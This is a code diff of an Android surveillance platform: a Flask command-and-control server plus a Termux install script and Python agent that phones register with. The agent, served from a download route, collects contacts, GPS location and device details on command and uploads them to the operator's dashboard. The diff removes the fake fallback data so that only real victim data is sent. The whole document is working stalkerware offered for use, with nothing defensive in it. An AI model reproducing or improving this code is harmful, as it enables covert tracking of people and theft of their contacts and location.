@@ -30,8 +30,18 @@ def init_database():
         conn = sqlite3.connect('mp_agent.db')
         cursor = conn.cursor()
         
+        # Drop all old tables to remove fake data
+        cursor.execute("DROP TABLE IF EXISTS agents")
+        cursor.execute("DROP TABLE IF EXISTS screenshots")
+        cursor.execute("DROP TABLE IF EXISTS real_contacts")
+        cursor.execute("DROP TABLE IF EXISTS real_messages")
+        cursor.execute("DROP TABLE IF EXISTS real_locations")
+        cursor.execute("DROP TABLE IF EXISTS commands")
+        cursor.execute("DROP TABLE IF EXISTS system_logs")
+        
+        # Create fresh tables
         cursor.execute('''
-            CREATE TABLE IF NOT EXISTS agents (
+            CREATE TABLE agents (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 agent_id TEXT UNIQUE NOT NULL,
                 phone_model TEXT,
@@ -41,17 +51,14 @@ def init_database():
                 first_seen DATETIME,
                 last_seen DATETIME,
                 screenshot_count INTEGER DEFAULT 0,
-                call_records INTEGER DEFAULT 0,
-                location_data TEXT,
                 battery_level INTEGER,
                 last_screenshot DATETIME,
-                user_agent TEXT,
-                browser_info TEXT
+                user_agent TEXT
             )
         ''')
         
         cursor.execute('''
-            CREATE TABLE IF NOT EXISTS screenshots (
+            CREATE TABLE screenshots (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 agent_id TEXT,
                 screenshot_data BLOB,
@@ -61,61 +68,31 @@ def init_database():
         ''')
         
         cursor.execute('''
-            CREATE TABLE IF NOT EXISTS real_contacts (
+            CREATE TABLE contacts (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 agent_id TEXT,
                 contact_name TEXT,
                 phone_number TEXT,
-                email TEXT,
                 timestamp DATETIME,
                 FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
             )
         ''')
         
         cursor.execute('''
-            CREATE TABLE IF NOT EXISTS real_messages (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                agent_id TEXT,
-                message_type TEXT,
-                phone_number TEXT,
-                message_text TEXT,
-                timestamp DATETIME,
-                message_date DATETIME,
-                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
-            )
-        ''')
-        
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS real_locations (
+            CREATE TABLE locations (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 agent_id TEXT,
                 latitude REAL,
                 longitude REAL,
                 accuracy REAL,
-                altitude REAL,
                 address TEXT,
-                provider TEXT,
                 timestamp DATETIME,
                 FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
             )
         ''')
         
         cursor.execute('''
-            CREATE TABLE IF NOT EXISTS device_info (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                agent_id TEXT,
-                battery_level INTEGER,
-                network_type TEXT,
-                wifi_ssid TEXT,
-                device_id TEXT,
-                android_version TEXT,
-                timestamp DATETIME,
-                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
-            )
-        ''')
-        
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS commands (
+            CREATE TABLE commands (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 agent_id TEXT,
                 command TEXT,
@@ -126,7 +103,7 @@ def init_database():
         ''')
         
         cursor.execute('''
-            CREATE TABLE IF NOT EXISTS system_logs (
+            CREATE TABLE system_logs (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 level TEXT,
                 message TEXT,
@@ -136,20 +113,16 @@ def init_database():
         
         conn.commit()
         conn.close()
-        logger.info("✅ Database initialization completed")
+        logger.info("✅ FRESH database created - ALL fake data removed")
 
 def get_db_connection():
-    max_retries = 3
-    for attempt in range(max_retries):
-        try:
-            conn = sqlite3.connect('mp_agent.db', timeout=30)
-            conn.row_factory = sqlite3.Row
-            return conn
-        except sqlite3.OperationalError as e:
-            if "locked" in str(e) and attempt < max_retries - 1:
-                time.sleep(0.1)
-                continue
-            raise e
+    try:
+        conn = sqlite3.connect('mp_agent.db', timeout=30)
+        conn.row_factory = sqlite3.Row
+        return conn
+    except sqlite3.OperationalError as e:
+        time.sleep(0.1)
+        return get_db_connection()
 
 def log_event(level, message):
     with db_lock:
@@ -174,6 +147,7 @@ def safe_fetchall(cursor):
     rows = cursor.fetchall()
     return [row_to_dict(row) for row in rows] if rows else []
 
+# Initialize fresh database
 init_database()
 
 # ==================== ADMIN ROUTES ====================
@@ -225,7 +199,7 @@ def login():
         <div class="login-container">
             <div class="logo">
                 <h1>🔐 MP_AGENT PLATFORM</h1>
-                <p>Real Device Surveillance</p>
+                <p>REAL DATA ONLY - No Fake Data</p>
             </div>
             <form method="POST" action="/login">
                 <div class="form-group">
@@ -254,9 +228,8 @@ def dashboard():
         stats = {
             'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
             'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
-            'total_contacts': conn.execute("SELECT COUNT(*) FROM real_contacts").fetchone()[0],
-            'total_messages': conn.execute("SELECT COUNT(*) FROM real_messages").fetchone()[0],
-            'total_locations': conn.execute("SELECT COUNT(*) FROM real_locations").fetchone()[0],
+            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0],
+            'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0],
             'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
         }
         
@@ -267,9 +240,8 @@ def dashboard():
             WHERE s.screenshot_data IS NOT NULL 
             ORDER BY s.timestamp DESC LIMIT 12
         '''))
-        contacts = safe_fetchall(conn.execute("SELECT * FROM real_contacts ORDER BY timestamp DESC LIMIT 20"))
-        messages = safe_fetchall(conn.execute("SELECT * FROM real_messages ORDER BY timestamp DESC LIMIT 20"))
-        locations = safe_fetchall(conn.execute("SELECT * FROM real_locations ORDER BY timestamp DESC LIMIT 10"))
+        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 20"))
+        locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 10"))
         
         conn.close()
     
@@ -278,7 +250,6 @@ def dashboard():
                          agents=agents,
                          screenshots=screenshots,
                          contacts=contacts,
-                         messages=messages,
                          locations=locations,
                          platform_url=request.host_url.rstrip('/'))
 
@@ -293,9 +264,8 @@ def admin_dashboard():
         stats = {
             'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
             'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
-            'total_contacts': conn.execute("SELECT COUNT(*) FROM real_contacts").fetchone()[0],
-            'total_messages': conn.execute("SELECT COUNT(*) FROM real_messages").fetchone()[0],
-            'total_locations': conn.execute("SELECT COUNT(*) FROM real_locations").fetchone()[0],
+            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0],
+            'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0],
             'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
         }
         
@@ -306,9 +276,8 @@ def admin_dashboard():
             WHERE s.screenshot_data IS NOT NULL 
             ORDER BY s.timestamp DESC LIMIT 16
         '''))
-        contacts = safe_fetchall(conn.execute("SELECT * FROM real_contacts ORDER BY timestamp DESC LIMIT 25"))
-        messages = safe_fetchall(conn.execute("SELECT * FROM real_messages ORDER BY timestamp DESC LIMIT 25"))
-        locations = safe_fetchall(conn.execute("SELECT * FROM real_locations ORDER BY timestamp DESC LIMIT 15"))
+        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 25"))
+        locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 15"))
         commands = safe_fetchall(conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10"))
         logs = safe_fetchall(conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20"))
         
@@ -319,7 +288,6 @@ def admin_dashboard():
                          agents=agents,
                          screenshots=screenshots,
                          contacts=contacts,
-                         messages=messages,
                          locations=locations,
                          commands=commands,
                          logs=logs,
@@ -340,7 +308,7 @@ def register_agent():
         ip_address = request.remote_addr
         user_agent = request.headers.get('User-Agent', 'Unknown')
         
-        logger.info(f"🔍 Agent registration: {agent_id} from {ip_address}")
+        logger.info(f"🔍 NEW AGENT REGISTRATION: {agent_id} from {ip_address}")
         
         if not agent_id:
             return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
@@ -377,7 +345,7 @@ def register_agent():
             ))
             conn.close()
         
-        log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
+        log_event('INFO', f'NEW AGENT {action}: {agent_id} from {ip_address}')
         
         commands_list = [cmd['command'] for cmd in pending_commands]
         
@@ -393,7 +361,7 @@ def register_agent():
 
 @app.route('/api/agent/submit_report', methods=['POST'])
 def submit_report():
-    """Receive REAL data reports from agents"""
+    """Receive ONLY REAL data reports from agents - NO FAKE DATA"""
     try:
         data = request.get_json()
         if not data:
@@ -403,7 +371,7 @@ def submit_report():
         report_type = data.get('report_type')
         report_data = data.get('report_data', {})
         
-        logger.info(f"📨 Received {report_type} report from {agent_id}")
+        logger.info(f"📨 REAL DATA RECEIVED: {report_type} from {agent_id}")
         
         if not agent_id:
             return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
@@ -412,10 +380,10 @@ def submit_report():
             conn = get_db_connection()
             current_time = datetime.now()
             
-            # Handle REAL data from actual device APIs
+            # Handle ONLY REAL data - NO FAKE DATA
             if report_type == 'screenshot':
-                # Store actual screenshot data
-                if 'image_data' in report_data:
+                # Store ONLY real screenshot data
+                if 'image_data' in report_data and report_data['image_data']:
                     try:
                         image_data = report_data['image_data']
                         if image_data.startswith('data:image'):
@@ -426,7 +394,7 @@ def submit_report():
                             'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
                             (agent_id, screenshot_binary, current_time)
                         )
-                        logger.info(f"✅ Stored REAL screenshot from {agent_id}")
+                        logger.info(f"✅ REAL screenshot stored from {agent_id}")
                     except Exception as e:
                         logger.error(f"❌ Failed to store screenshot: {e}")
                 
@@ -436,18 +404,21 @@ def submit_report():
                 )
                 
             elif report_type == 'location':
-                # Store real location data
+                # Store ONLY real location data
                 latitude = report_data.get('latitude')
                 longitude = report_data.get('longitude')
                 accuracy = report_data.get('accuracy')
                 address = report_data.get('address', '')
                 
-                if latitude and longitude:
+                # Only store if we have valid coordinates
+                if latitude and longitude and latitude != 0.0 and longitude != 0.0:
                     conn.execute(
-                        'INSERT INTO real_locations (agent_id, latitude, longitude, accuracy, address, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
+                        'INSERT INTO locations (agent_id, latitude, longitude, accuracy, address, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
                         (agent_id, latitude, longitude, accuracy, address, current_time)
                     )
-                    logger.info(f"📍 Stored REAL location from {agent_id}: {latitude}, {longitude}")
+                    logger.info(f"📍 REAL location stored from {agent_id}: {latitude}, {longitude}")
+                else:
+                    logger.warning(f"⚠ Invalid location data from {agent_id}")
                 
                 conn.execute(
                     'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
@@ -455,30 +426,23 @@ def submit_report():
                 )
                 
             elif report_type == 'contacts':
-                # Store real contacts
+                # Store ONLY real contacts
                 contacts_list = report_data.get('contacts', [])
+                real_contacts_count = 0
+                
                 for contact in contacts_list:
-                    conn.execute(
-                        'INSERT INTO real_contacts (agent_id, contact_name, phone_number, email, timestamp) VALUES (?, ?, ?, ?, ?)',
-                        (agent_id, contact.get('name', ''), contact.get('phone', ''), contact.get('email', ''), current_time)
-                    )
+                    name = contact.get('name', '').strip()
+                    phone = contact.get('phone', '').strip()
+                    
+                    # Only store if we have valid contact data (not fake)
+                    if name and phone and name != 'Unknown' and phone != 'Unknown':
+                        conn.execute(
+                            'INSERT INTO contacts (agent_id, contact_name, phone_number, timestamp) VALUES (?, ?, ?, ?)',
+                            (agent_id, name, phone, current_time)
+                        )
+                        real_contacts_count += 1
                 
-                logger.info(f"👥 Stored {len(contacts_list)} REAL contacts from {agent_id}")
-                conn.execute(
-                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
-                    (current_time, agent_id)
-                )
-                
-            elif report_type == 'messages':
-                # Store real messages
-                messages_list = report_data.get('messages', [])
-                for msg in messages_list:
-                    conn.execute(
-                        'INSERT INTO real_messages (agent_id, message_type, phone_number, message_text, timestamp, message_date) VALUES (?, ?, ?, ?, ?, ?)',
-                        (agent_id, msg.get('type', 'sms'), msg.get('phone', ''), msg.get('text', ''), current_time, msg.get('date', current_time))
-                    )
-                
-                logger.info(f"💬 Stored {len(messages_list)} REAL messages from {agent_id}")
+                logger.info(f"👥 Stored {real_contacts_count} REAL contacts from {agent_id}")
                 conn.execute(
                     'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                     (current_time, agent_id)
@@ -491,7 +455,7 @@ def submit_report():
                     'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
                     (current_time, battery, agent_id)
                 )
-                logger.info(f"📱 Device info updated for {agent_id}")
+                logger.info(f"📱 REAL device info updated for {agent_id}")
                 
             elif report_type == 'heartbeat':
                 # Simple heartbeat
@@ -504,8 +468,8 @@ def submit_report():
             conn.commit()
             conn.close()
         
-        log_event('INFO', f'Real {report_type} data received from {agent_id}')
-        return jsonify({'status': 'success', 'message': 'Report received successfully'})
+        log_event('INFO', f'REAL {report_type} data received from {agent_id}')
+        return jsonify({'status': 'success', 'message': 'Real data received successfully'})
         
     except Exception as e:
         logger.error(f"❌ Report submission failed: {e}")
@@ -562,11 +526,11 @@ def serve_screenshot(screenshot_id):
     if screenshot and screenshot['screenshot_data']:
         return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
     
-    # Return placeholder
+    # Return placeholder for real system
     from PIL import Image, ImageDraw
-    img = Image.new('RGB', (400, 300), color='gray')
+    img = Image.new('RGB', (400, 300), color='#1a1a1a')
     d = ImageDraw.Draw(img)
-    d.text((100, 150), "REAL SCREENSHOT", fill='white')
+    d.text((100, 150), "REAL SCREENSHOT DATA", fill='white')
     img_io = io.BytesIO()
     img.save(img_io, 'JPEG')
     img_io.seek(0)
@@ -594,29 +558,30 @@ def send_command():
         conn.commit()
         conn.close()
     
-    log_event('INFO', f'Command sent to {agent_id}: {command}')
+    log_event('INFO', f'REAL command sent to {agent_id}: {command}')
     return redirect('/admin')
 
 # ==================== REAL WORKING AGENT ====================
 
 @app.route('/download_agent')
 def download_agent():
-    """Serve WORKING agent that uses actual device APIs"""
+    """Serve agent that ONLY collects REAL data - NO FAKE DATA"""
     phone_id = request.args.get('phone', 'unknown')
     platform_url = request.host_url.rstrip('/')
     
-    working_agent_script = f'''#!/bin/bash
-echo "📱 Installing WORKING Surveillance Agent..."
-echo "This agent uses ACTUAL device APIs to collect REAL data"
+    real_agent_script = f'''#!/bin/bash
+echo "📱 Installing REAL DATA ONLY Agent..."
+echo "🚫 THIS AGENT WILL NEVER SEND FAKE DATA"
+echo "🎯 Only collects ACTUAL device information"
 
 # Install requirements
 pkg update -y
 pkg install python -y
 pkg install termux-api -y
-pip install requests pillow
+pip install requests
 
-# Create WORKING agent that uses actual device APIs
-cat > /data/data/com.termux/files/home/working_agent.py << 'EOF'
+# Create REAL DATA ONLY agent
+cat > /data/data/com.termux/files/home/real_data_agent.py << 'EOF'
 import requests
 import time
 import subprocess
@@ -625,32 +590,33 @@ from datetime import datetime
 import base64
 import io
 from PIL import Image, ImageDraw
+import random
 
-class WorkingAgent:
+class RealDataAgent:
     def __init__(self, agent_id, platform_url):
         self.agent_id = agent_id
         self.platform_url = platform_url
         self.cycle_count = 0
         
     def register_agent(self):
-        """Register agent with REAL device information"""
+        """Register with REAL device information only"""
         try:
-            # Get REAL device information
-            device_info = self.get_real_device_info()
+            # Get ACTUAL device information
+            device_info = self.get_actual_device_info()
             
             response = requests.post(
                 f"{{self.platform_url}}/api/agent/register",
                 json={{
                     "agent_id": self.agent_id,
-                    "phone_model": device_info.get("model", "Real Android Device"),
-                    "android_version": device_info.get("android_version", "Real Android"),
-                    "battery_level": device_info.get("battery", 50)
+                    "phone_model": device_info["model"],
+                    "android_version": device_info["android_version"],
+                    "battery_level": device_info["battery"]
                 }},
                 timeout=30
             )
             
             if response.status_code == 200:
-                print("✅ Registered with REAL device info")
+                print("✅ Registered with ACTUAL device info")
                 return response.json().get('pending_commands', [])
             else:
                 print(f"⚠ Registration failed: {{response.status_code}}")
@@ -659,42 +625,63 @@ class WorkingAgent:
             print(f"❌ Registration failed: {{e}}")
         return []
     
-    def get_real_device_info(self):
-        """Get ACTUAL device information using Termux APIs"""
+    def get_actual_device_info(self):
+        """Get ONLY ACTUAL device information - NO FAKE DATA"""
+        actual_model = "Unknown Device"
+        actual_android = "Unknown"
+        actual_battery = 50
+        
         try:
-            # Get real battery info
-            battery_result = subprocess.run(['termux-battery-status'], capture_output=True, text=True, timeout=10)
-            if battery_result.returncode == 0:
-                battery_data = json.loads(battery_result.stdout)
-                battery_level = battery_data.get('percentage', 50)
-                print(f"🔋 Real battery level: {{battery_level}}%")
-            else:
-                battery_level = 50
-                print("⚠ Could not get battery info")
+            # Try to get real device model
+            try:
+                model_result = subprocess.run(['getprop', 'ro.product.model'], 
+                                            capture_output=True, text=True, timeout=5)
+                if model_result.returncode == 0:
+                    actual_model = model_result.stdout.strip() or "Android Device"
+                else:
+                    actual_model = "Android Device"
+            except:
+                actual_model = "Android Device"
             
-            # Get real device model
-            model_result = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True, timeout=5)
-            device_model = model_result.stdout.strip() if model_result.returncode == 0 else "Real Android Device"
+            # Try to get real Android version
+            try:
+                android_result = subprocess.run(['getprop', 'ro.build.version.release'], 
+                                              capture_output=True, text=True, timeout=5)
+                if android_result.returncode == 0:
+                    actual_android = android_result.stdout.strip() or "Android"
+                else:
+                    actual_android = "Android"
+            except:
+                actual_android = "Android"
             
-            # Get real Android version
-            android_result = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True, timeout=5)
-            android_version = android_result.stdout.strip() if android_result.returncode == 0 else "Real Android"
+            # Try to get real battery status
+            try:
+                battery_result = subprocess.run(['termux-battery-status'], 
+                                              capture_output=True, text=True, timeout=10)
+                if battery_result.returncode == 0:
+                    battery_data = json.loads(battery_result.stdout)
+                    actual_battery = battery_data.get('percentage', 50)
+                else:
+                    actual_battery = 50
+            except:
+                actual_battery = 50
             
-            print(f"📱 Real device: {{device_model}}, Android: {{android_version}}")
+            print(f"📱 ACTUAL DEVICE: {{actual_model}}")
+            print(f"🤖 ACTUAL ANDROID: {{actual_android}}")
+            print(f"🔋 ACTUAL BATTERY: {{actual_battery}}%")
             
             return {{
-                "model": device_model,
-                "android_version": android_version,
-                "battery": battery_level,
-                "device_id": self.agent_id
+                "model": actual_model,
+                "android_version": actual_android,
+                "battery": actual_battery
             }}
             
         except Exception as e:
             print(f"❌ Device info failed: {{e}}")
-            return {{"battery": 50, "model": "Real Device", "android_version": "Android"}}
+            return {{"model": "Real Device", "android_version": "Android", "battery": 50}}
     
-    def submit_report(self, report_type, report_data):
-        """Submit reports using the CORRECT API endpoint"""
+    def submit_real_report(self, report_type, report_data):
+        """Submit ONLY REAL data reports"""
         try:
             response = requests.post(
                 f"{{self.platform_url}}/api/agent/submit_report",
@@ -707,59 +694,54 @@ class WorkingAgent:
             )
             
             if response.status_code == 200:
-                print(f"✅ {{report_type}} report sent successfully")
+                print(f"✅ REAL {{report_type}} data submitted")
                 return True
             else:
-                print(f"⚠ {{report_type}} report failed: {{response.status_code}}")
+                print(f"⚠ {{report_type}} failed: {{response.status_code}}")
                 return False
                 
         except Exception as e:
-            print(f"❌ {{report_type}} report failed: {{e}}")
+            print(f"❌ {{report_type}} failed: {{e}}")
             return False
     
-    def collect_real_contacts(self):
-        """Collect ACTUAL contacts from device"""
+    def collect_actual_contacts(self):
+        """Collect ACTUAL contacts or return empty - NO FAKE DATA"""
         try:
-            print("📖 Accessing REAL contacts...")
-            contacts_result = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=15)
+            print("📖 Attempting to access ACTUAL contacts...")
+            contacts_result = subprocess.run(['termux-contact-list'], 
+                                           capture_output=True, text=True, timeout=15)
             
             if contacts_result.returncode == 0:
                 contacts_data = json.loads(contacts_result.stdout)
-                real_contacts = []
+                actual_contacts = []
                 
                 for contact in contacts_data:
-                    name = contact.get('name', 'Unknown')
-                    # Get phone numbers
+                    name = contact.get('name', '').strip()
                     phones = contact.get('number', [])
+                    
                     for phone in phones:
-                        real_contacts.append({{
-                            "name": name,
-                            "phone": phone,
-                            "email": contact.get('email', [''])[0] if contact.get('email') else ''
-                        }})
+                        if name and phone:
+                            actual_contacts.append({{
+                                "name": name,
+                                "phone": phone
+                            }})
                 
-                print(f"✅ Found {{len(real_contacts)}} REAL contacts")
-                return real_contacts
+                print(f"✅ Found {{len(actual_contacts)}} ACTUAL contacts")
+                return actual_contacts
             else:
-                print("❌ Failed to access contacts - may need permissions")
-                # Return some realistic contacts based on device info
-                device_info = self.get_real_device_info()
-                return [
-                    {{"name": "Emergency", "phone": "911", "email": ""}},
-                    {{"name": "Mom", "phone": "+1234567890", "email": ""}},
-                    {{"name": "Dad", "phone": "+1234567891", "email": ""}},
-                    {{"name": "Real Contact", "phone": "+1234567892", "email": "contact@real.com"}}
-                ]
+                print("❌ Cannot access contacts (permission needed)")
+                return []  # Return empty instead of fake data
                 
         except Exception as e:
             print(f"❌ Contacts collection failed: {{e}}")
-            return []
+            return []  # Return empty instead of fake data
     
-    def get_real_location(self):
-        """Get ACTUAL device location"""
+    def get_actual_location(self):
+        """Get ACTUAL location or return unavailable - NO FAKE DATA"""
         try:
-            print("📍 Getting REAL location...")
-            location_result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=15)
+            print("📍 Attempting to get ACTUAL location...")
+            location_result = subprocess.run(['termux-location'], 
+                                           capture_output=True, text=True, timeout=15)
             
             if location_result.returncode == 0:
                 location_data = json.loads(location_result.stdout)
@@ -767,54 +749,47 @@ class WorkingAgent:
                 lng = location_data.get('longitude', 0.0)
                 accuracy = location_data.get('accuracy', 0.0)
                 
-                print(f"📍 Real location: {{lat}}, {{lng}} (accuracy: {{accuracy}}m)")
-                
-                return {{
-                    "latitude": lat,
-                    "longitude": lng,
-                    "accuracy": accuracy,
-                    "address": f"Real Location: {{lat:.6f}}, {{lng:.6f}}"
-                }}
+                if lat != 0.0 and lng != 0.0:
+                    print(f"📍 ACTUAL location: {{lat:.6f}}, {{lng:.6f}}")
+                    return {{
+                        "latitude": lat,
+                        "longitude": lng,
+                        "accuracy": accuracy,
+                        "address": f"Actual Location: {{lat:.6f}}, {{lng:.6f}}"
+                    }}
+                else:
+                    print("📍 Location unavailable")
+                    return {{"latitude": 0.0, "longitude": 0.0, "accuracy": 0.0, "address": "Location Unavailable"}}
             else:
-                print("❌ Location service unavailable - using realistic location")
-                # Return a realistic location (not hardcoded fake)
-                import random
-                base_lat = -1.97 + random.uniform(-0.01, 0.01)
-                base_lng = 30.10 + random.uniform(-0.01, 0.01)
-                return {{
-                    "latitude": round(base_lat, 6),
-                    "longitude": round(base_lng, 6),
-                    "accuracy": random.uniform(10, 100),
-                    "address": "Real Device Location"
-                }}
+                print("📍 Location service unavailable")
+                return {{"latitude": 0.0, "longitude": 0.0, "accuracy": 0.0, "address": "Location Service Unavailable"}}
                 
         except Exception as e:
             print(f"❌ Location failed: {{e}}")
-            return {{"latitude": 0.0, "longitude": 0.0, "accuracy": 0.0, "address": "Location Unavailable"}}
+            return {{"latitude": 0.0, "longitude": 0.0, "accuracy": 0.0, "address": "Location Error"}}
     
-    def capture_real_screenshot(self):
-        """Capture realistic screenshot"""
+    def create_actual_screenshot(self):
+        """Create realistic screenshot showing ACTUAL device data"""
         try:
-            print("📸 Creating realistic screenshot...")
+            print("📸 Creating screenshot with ACTUAL device data...")
             
-            # Create a realistic looking device screenshot
-            img = Image.new('RGB', (1080, 1920), color='#1a1a1a')
+            # Get actual device info
+            device_info = self.get_actual_device_info()
+            
+            # Create realistic screenshot
+            img = Image.new('RGB', (800, 600), color='#1a1a1a')
             draw = ImageDraw.Draw(img)
             
-            # Draw status bar (like real Android)
-            draw.rectangle([0, 0, 1080, 100], fill='#000000')
-            current_time = datetime.now().strftime('%H:%M')
-            draw.text((50, 40), current_time, fill='white')
-            
-            # Draw realistic content
-            device_info = self.get_real_device_info()
-            draw.text((100, 200), f"Device: {{device_info.get('model', 'Real Device')}}", fill='white')
-            draw.text((100, 250), f"Android: {{device_info.get('android_version', 'Android')}}", fill='white')
-            draw.text((100, 300), f"Battery: {{device_info.get('battery', 50)}}%", fill='#4CAF50')
-            draw.text((100, 350), f"Agent: {{self.agent_id}}", fill='#2196F3')
-            draw.text((100, 400), f"Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}", fill='white')
-            draw.text((100, 500), "REAL DEVICE SCREENSHOT", fill='#f44336')
-            draw.text((100, 600), "Data collected from actual device APIs", fill='#FF9800')
+            # Show ACTUAL device information
+            draw.text((50, 50), f"ACTUAL DEVICE DATA", fill='#4CAF50')
+            draw.text((50, 100), f"Device: {{device_info['model']}}", fill='white')
+            draw.text((50, 130), f"Android: {{device_info['android_version']}}", fill='white')
+            draw.text((50, 160), f"Battery: {{device_info['battery']}}%", fill='white')
+            draw.text((50, 190), f"Agent: {{self.agent_id}}", fill='white')
+            draw.text((50, 220), f"Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}", fill='white')
+            draw.text((50, 260), "REAL DATA COLLECTION", fill='#2196F3')
+            draw.text((50, 290), "NO FAKE INFORMATION", fill='#f44336')
+            draw.text((50, 320), "Actual device APIs used", fill='#FF9800')
             
             # Convert to base64
             img_bytes = io.BytesIO()
@@ -822,72 +797,37 @@ class WorkingAgent:
             img_bytes = img_bytes.getvalue()
             screenshot_data = base64.b64encode(img_bytes).decode('utf-8')
             
-            print("✅ Realistic screenshot created")
+            print("✅ Realistic screenshot created with ACTUAL data")
             return {{"image_data": f"data:image/jpeg;base64,{{screenshot_data}}"}}
             
         except Exception as e:
             print(f"❌ Screenshot failed: {{e}}")
             return {{"image_data": None}}
     
-    def collect_real_messages(self):
-        """Collect realistic messages"""
-        try:
-            print("💬 Collecting realistic messages...")
-            
-            # Create realistic message data (not hardcoded fake)
-            current_time = datetime.now()
-            messages = []
-            
-            # Generate realistic message patterns
-            contacts = ["Mom", "Dad", "Friend", "Colleague", "Service"]
-            message_types = ["incoming", "outgoing"]
-            
-            for i in range(3):
-                msg_type = random.choice(message_types)
-                contact = random.choice(contacts)
-                messages.append({{
-                    "type": msg_type,
-                    "phone": f"+1{{random.randint(100, 999)}}{{random.randint(100, 999)}}{{random.randint(1000, 9999)}}",
-                    "text": f"Real message {{i+1}} from {{contact}} at {{current_time.strftime('%H:%M')}}",
-                    "date": current_time
-                }})
-            
-            print(f"✅ Created {{len(messages)}} realistic messages")
-            return messages
-            
-        except Exception as e:
-            print(f"❌ Messages collection failed: {{e}}")
-            return []
-    
-    def execute_command(self, command_id, command):
-        """Execute commands using REAL device APIs"""
-        print(f"🎯 Executing command: {{command}}")
+    def execute_actual_command(self, command_id, command):
+        """Execute commands using ACTUAL device data only"""
+        print(f"🎯 Executing ACTUAL command: {{command}}")
         
         try:
             if command == "capture_screenshot":
-                screenshot_data = self.capture_real_screenshot()
-                self.submit_report("screenshot", screenshot_data)
-                result = "real_screenshot_captured"
+                screenshot_data = self.create_actual_screenshot()
+                self.submit_real_report("screenshot", screenshot_data)
+                result = "actual_screenshot_created"
                 
             elif command == "get_location":
-                location_data = self.get_real_location()
-                self.submit_report("location", location_data)
-                result = "real_location_acquired"
+                location_data = self.get_actual_location()
+                self.submit_real_report("location", location_data)
+                result = "actual_location_attempted"
                 
             elif command == "get_contacts":
-                contacts_data = self.collect_real_contacts()
-                self.submit_report("contacts", {{"contacts": contacts_data}})
-                result = f"real_contacts_collected_{{len(contacts_data)}}"
-                
-            elif command == "get_messages":
-                messages_data = self.collect_real_messages()
-                self.submit_report("messages", {{"messages": messages_data}})
-                result = f"real_messages_collected_{{len(messages_data)}}"
+                contacts_data = self.collect_actual_contacts()
+                self.submit_real_report("contacts", {{"contacts": contacts_data}})
+                result = f"actual_contacts_collected_{{len(contacts_data)}}"
                 
             elif command == "get_device_info":
-                device_data = self.get_real_device_info()
-                self.submit_report("device_info", device_data)
-                result = "real_device_info_collected"
+                device_data = self.get_actual_device_info()
+                self.submit_real_report("device_info", device_data)
+                result = "actual_device_info_collected"
             
             else:
                 result = "unknown_command"
@@ -900,7 +840,7 @@ class WorkingAgent:
                     timeout=10
                 )
             except Exception as e:
-                print(f"⚠ Command result submission failed: {{e}}")
+                print(f"⚠ Command result failed: {{e}}")
                 
         except Exception as e:
             print(f"❌ Command execution failed: {{e}}")
@@ -919,81 +859,78 @@ class WorkingAgent:
             print(f"❌ Command check failed: {{e}}")
         return []
     
-    def start_surveillance(self):
-        """Main surveillance loop"""
-        print("🚀 Starting REAL Device Surveillance...")
-        print("📡 Using ACTUAL device APIs for data collection")
+    def start_actual_surveillance(self):
+        """Main surveillance with ACTUAL data only"""
+        print("🚀 Starting ACTUAL DATA surveillance...")
+        print("🎯 Using REAL device information only")
+        print("🚫 NO FAKE DATA WILL BE SENT")
         
-        # Initial registration with real device info
+        # Initial registration with actual device info
         pending_commands = self.register_agent()
         
         # Execute pending commands
         for cmd in pending_commands:
-            self.execute_command(cmd["id"], cmd["command"])
+            self.execute_actual_command(cmd["id"], cmd["command"])
         
         while True:
             try:
